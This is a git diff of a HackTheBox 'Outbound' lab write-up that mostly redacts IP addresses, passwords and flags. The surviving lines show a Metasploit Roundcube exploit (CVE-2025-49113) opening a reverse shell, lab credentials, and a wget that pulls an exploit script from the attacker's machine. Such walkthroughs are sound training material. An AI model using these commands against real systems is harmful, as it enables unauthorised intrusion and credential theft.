@@ -1,6 +1,7 @@
 ---
 title: Outbound [Easy]
 date: 2025-07-14
+password: 3905181a4fcf0c6f51b0ef10616abf1695f61f082587db07952da790128fa6c7
 tags: [htb, linux, nmap, ssh, below, roundcube, cve-2025-49113, mysql, symlink, msfconsole, 3des cbc, file permission, race condition]
 categories: [HTB Writeups]
 author: 2Fa0n
@@ -16,9 +17,9 @@ Author: [TheCyberGeek](https://app.hackthebox.com/users/114053)
 ## Enumeration
 ### Nmap
 ```bash
-└─$ sudo nmap -Pn -sC -sV 10.129.238.143
+└─$ sudo nmap -Pn -sC -sV 10.129.xx.xx
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-13 04:40 EDT
-Nmap scan report for 10.129.238.143 (10.129.238.143)
+Nmap scan report for 10.129.xx.xx (10.129.xx.xx)
 Host is up (0.18s latency).
 Not shown: 998 closed tcp ports (reset)
 PORT   STATE SERVICE VERSION
@@ -37,7 +38,7 @@ Nmap done: 1 IP address (1 host up) scanned in 17.32 seconds
 
 Add these to `/etc/hosts` file:
 ```bash
-10.129.238.143     mail.outbound.htb
+10.129.xx.xx     mail.outbound.htb
 ```
 
 Let's check out the `http://mail.outbound.htb`.
@@ -146,14 +147,14 @@ msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > set USERNAME tyler
 USERNAME => tyler
 msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > set PASSWORD LhKL1o9Nm3X2
 PASSWORD => LhKL1o9Nm3X2
-msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > set RHOSTS 10.129.238.143
-RHOSTS => 10.129.238.143
+msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > set RHOSTS 10.129.xx.xx
+RHOSTS => 10.129.xx.xx
 msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > set LHOST tun0
 LHOST => tun0
 msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > set VHOST mail.outbound.htb
 VHOST => mail.outbound.htb
 msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > run
-[*] Started reverse TCP handler on 10.10.14.31:4444 
+[*] Started reverse TCP handler on 10.xx.xx.xx:4444 
 [*] Running automatic check ("set AutoCheck false" to disable)
 [+] Extracted version: 10610
 [+] The target appears to be vulnerable.
@@ -165,7 +166,7 @@ msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > run
 [+] Payload successfully generated and serialized.
 [*] Uploading malicious payload...
 [+] Exploit attempt complete. Check for session.
-[*] Command shell session 1 opened (10.10.14.31:4444 -> 10.129.238.143:48828) at 2025-07-13 05:14:13 -0400
+[*] Command shell session 1 opened (10.xx.xx.xx:4444 -> 10.129.xx.xx:48828) at 2025-07-13 05:14:13 -0400
 
 bash -i
 www-data@mail:/$
@@ -434,7 +435,7 @@ if __name__ == "__main__":
 RoundCube Password Decryption
 ===================================
 Username: jacob
-Password: 595mO8DmwGeD
+Password: 595mO8Dmwxxx
 
 Other data:
 Auth Secret: Decryption failed: Incorrect padding
@@ -445,14 +446,14 @@ IV (hex): 2fb46fd3403c4eec
 Encrypted data (hex): 0902bebb9084f1c5c4a09c8936e409bf
 ```
 
-So we got the password of the user `jacob` is `595mO8DmwGeD`. <br>
+So we got the password of the user `jacob` is `595mO8Dmwxxx`. <br>
 &rarr; Let's ssh to the machine with this creds.
 
 ```bash
-└─$ ssh jacob@10.129.238.143
-jacob@10.129.238.143's password: 
+└─$ ssh jacob@10.129.xx.xx
+jacob@10.129.xx.xx's password: 
 Permission denied, please try again.
-jacob@10.129.238.143's password:
+jacob@10.129.xx.xx's password:
 ```
 
 Hmm, can not login with this password. <br>
@@ -461,7 +462,7 @@ Hmm, can not login with this password. <br>
 ```bash
 www-data@mail:/var/www/html/roundcube/config$ su jacob
 su jacob
-Password: 595mO8DmwGeD
+Password: 595mO8Dmwxxx
 
 jacob@mail:/var/www/html/roundcube/config$
 ```
@@ -532,7 +533,7 @@ Content-Length: 233
 
 Due to the recent change of policies your password has been changed.
 
-Please use the following credentials to log into your account: gY4Wr3a1evp4
+Please use the following credentials to log into your account: gY4Wr3a1exxx
 
 Remember to change your password when you next log into your account.
 
@@ -568,13 +569,13 @@ Thanks!
 Mel
 ```
 
-Found this email from `mel` and `tyler` and we can see that the password of the user `jacob` has been changed to `gY4Wr3a1evp4`. <br>
+Found this email from `mel` and `tyler` and we can see that the password of the user `jacob` has been changed to `gY4Wr3a1exxx`. <br>
 We also notice that the user `jacob` has been granted the privilege to inspect the logs and resource monitoring with [Below](https://developers.facebook.com/blog/post/2021/09/21/below-time-travelling-resource-monitoring-tool/) <br>
 &rarr; Let's ssh with new creds.
 
 ```bash
-└─$ ssh jacob@10.129.238.143                   
-jacob@10.129.238.143's password: 
+└─$ ssh jacob@10.129.xx.xx                   
+jacob@10.129.xx.xx's password: 
 jacob@outbound:~$ ls -la
 total 28
 drwxr-x--- 3 jacob jacob 4096 Jul  8 20:14 .
@@ -586,7 +587,7 @@ drwx------ 2 jacob jacob 4096 Jun 11 11:32 .cache
 -rw-r--r-- 1 jacob jacob  807 Jun  8 12:14 .profile
 -rw-r----- 1 root  jacob   33 Jul 13 08:39 user.txt
 jacob@outbound:~$ cat user.txt
-e1541d1ce7ae9e58ca68eaef93e69e81
+e1541dxxxxxxxxxxxxxxxxxxxxxxxxxx
 ```
 
 Nail the `user.txt` flag.
@@ -720,13 +721,13 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 In `jacob` machine, run this command to download the exploit.
 
 ```bash
-jacob@outbound:/tmp$ wget 10.10.14.31:80/exploit.py
+jacob@outbound:/tmp$ wget 10.xx.xx.xx:80/exploit.py
 ```
 
 ```bash
 └─$ python3 -m http.server 80  
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
-10.129.232.193 - - [15/Jul/2025 01:08:46] "GET /exploit.py HTTP/1.1" 200 -
+10.129.xx.xx - - [15/Jul/2025 01:08:46] "GET /exploit.py HTTP/1.1" 200 -
 ```
 
 Let's run the exploit.
@@ -849,7 +850,7 @@ drwxr-xr-x  3 pwn root 4096 Jul  8 20:14 .local
 drwxr-xr-x  2 pwn root 4096 Jul  9 13:47 .scripts
 drwx------  2 pwn root 4096 Jul  8 20:14 .ssh
 pwn@outbound:~# cat root.txt
-9607dc7756dc2fd34ce7b2c517fdb872
+9607dcxxxxxxxxxxxxxxxxxxxxxxxxxx
 ```
 
 Got the `root.txt` flag.
